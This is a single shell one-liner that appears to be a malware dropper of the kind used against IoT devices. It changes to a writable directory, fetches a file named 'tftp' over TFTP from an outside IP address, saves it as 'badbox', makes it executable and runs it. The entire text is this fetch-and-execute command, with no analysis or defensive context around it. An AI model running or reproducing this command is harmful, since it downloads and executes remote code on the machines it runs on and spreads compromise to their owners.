cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.58.193.68 -c get tftp;cat tftp >badbox;chmod +x *;./badbox
